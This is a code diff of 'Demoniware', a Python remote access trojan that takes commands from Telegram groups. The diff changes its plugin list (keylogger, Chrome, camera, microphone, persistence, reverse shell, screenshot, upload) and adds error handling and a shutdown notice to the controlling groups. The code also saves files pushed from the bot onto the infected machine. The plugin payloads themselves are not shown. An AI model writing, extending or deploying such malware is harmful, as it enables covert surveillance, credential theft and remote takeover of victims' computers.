@@ -9,6 +9,8 @@ import platform
 import getpass
 import logging
 
+from telepot.exception import TelegramError
+
 from time import sleep, gmtime, strftime
 
 from Crypto.PublicKey import RSA
@@ -17,7 +19,7 @@ from Crypto.Hash import SHA256
 from threading import Thread
 
 from plugins import load_plugin
-from plugins import camera, chrome, download_upload, keylogger, microphone, persistence, proc, reverse_shell, screenshot, suicide, system
+from plugins import camera, chrome, upload, keylogger, microphone, persistence, proc, reverse_shell, screenshot, suicide, system
 
 
 class Demoniware(object):
@@ -54,7 +56,7 @@ class Demoniware(object):
 
         self.node = '{}__{}'.format(platform.node(), uuid.getnode())
 
-        self.plugin_list = ['camera', 'chrome', 'download_upload', 'keylogger', 'microphone', 'persistence', 'proc', 'reverse_shell', 'screenshot', 'suicide', 'system']
+        self.plugin_list = ['camera', 'chrome', 'upload', 'keylogger', 'microphone', 'persistence', 'proc', 'reverse_shell', 'screenshot', 'suicide', 'system']
 
         self.plugins = {}
 
@@ -82,7 +84,7 @@ class Demoniware(object):
                     self.logger.error('[-] Error loading plugin: {} ({})'.format(p, str(e)))
                     continue
         elif import_type == 'static':
-            for m in [camera, chrome, download_upload, keylogger, microphone, persistence, proc, reverse_shell, screenshot, suicide, system]:
+            for m in [camera, chrome, upload, keylogger, microphone, persistence, proc, reverse_shell, screenshot, suicide, system]:
                 name = m.__name__.replace('plugins.', '')
 
                 try:
@@ -109,22 +111,28 @@ class Demoniware(object):
             self.bot.sendMessage(chat_id, '[{}] {}'.format(self.node, chunk))
 
     def handle(self, msg):
-        content_type, chat_type, chat_id = telepot.glance(msg)
+        try:
+            content_type, chat_type, chat_id = telepot.glance(msg)
 
-        if chat_type == 'group':
-            if chat_id in self.allowed_groups:
-                if content_type == 'text':
-                    if self.secure:
-                        self.check_sign(msg)
-                    else:
-                        self.actions(msg['text'], chat_id)
-                elif content_type == 'document':
-                    if self.accept_download:
-                        self.bot.download_file(msg['document']['file_id'], msg['document']['file_name'])
-                        self.send_message(chat_id, 'The file {fname} has been saved to {cwd}'.format(fname=msg['document']['file_name'], cwd=os.getcwd()))
-                        self.accept_download = False
-        else:
-            self.send_message(chat_id, 'Fuck off!')
+            if chat_type == 'group':
+                if chat_id in self.allowed_groups:
+                    if content_type == 'text':
+                        if self.secure:
+                            self.check_sign(msg)
+                        else:
+                            self.actions(msg['text'], chat_id)
+                    elif content_type == 'document':
+                        if self.accept_download:
+                            self.bot.download_file(msg['document']['file_id'], msg['document']['file_name'])
+                            self.send_message(chat_id, 'The file {fname} has been saved to {cwd}'.format(fname=msg['document']['file_name'], cwd=os.getcwd()))
+                            self.accept_download = False
+            else:
+                self.send_message(chat_id, 'Fuck off!')
+        except TelegramError as e:
+            if 'Conflict: terminated by other long poll or webhook' in str(e):
+                pass
+            else:
+                self.send_message(chat_id, str(e))
 
     def check_sign(self, msg):
         cmd = msg['text'].split()
@@ -210,7 +218,15 @@ class Demoniware(object):
 
         self.bot.message_loop(self.handle)
         while 1:
-            sleep(10)
+            try:
+                sleep(10)
+            except KeyboardInterrupt:
+                for group in self.allowed_groups:
+                    try:
+                        self.send_message(group, 'Existing due to KeyboardInterrupt exception...')
+                    except:
+                        continue
+                sys.exit(0)
 
 if __name__ == "__main__":
 
